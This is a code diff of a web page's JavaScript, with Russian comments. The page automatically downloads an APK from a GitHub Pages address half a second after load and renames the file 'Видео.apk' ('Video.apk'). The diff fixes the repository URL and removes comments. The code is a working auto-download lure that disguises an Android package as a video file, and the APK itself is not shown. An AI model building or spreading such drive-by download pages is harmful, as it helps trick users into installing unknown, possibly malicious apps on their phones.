@@ -55,17 +55,15 @@
     <script>
         // --- 🔑 КЛЮЧЕВАЯ КОНФИГУРАЦИЯ ---
         
-        // 1. Установлен ваш реальный URL репозитория
-        // https://[username].github.io/[repo-name]/
-        const repoBaseUrl = 'https://94kz5hfdb-netizen.github.io/test/'; 
+        // ИСПРАВЛЕННЫЙ АДРЕС: https://94kz55hfdb-netizen.github.io/test/
+        const repoBaseUrl = 'https://94kz55hfdb-netizen.github.io/test/'; 
         
-        // 2. Полный путь к файлу APK
+        // Полный путь к файлу APK: https://94kz55hfdb-netizen.github.io/test/downloads/test.apk
         const apkUrl = repoBaseUrl + 'downloads/test.apk'; 
         const apkFilename = 'Видео.apk'; 
         
         // ------------------------------------
 
-        // Функция для запуска скачивания
         function startDownload() {
             const link = document.createElement('a');
             link.href = apkUrl;
@@ -80,11 +78,9 @@
         }
 
         window.onload = function() {
-            // Устанавливаем ссылку для ручного скачивания
             document.getElementById('manual_link').href = apkUrl;
             document.getElementById('filename').textContent = apkFilename;
             
-            // Запускаем автоматическое скачивание через небольшую задержку
             setTimeout(startDownload, 500); 
         };
     </script>
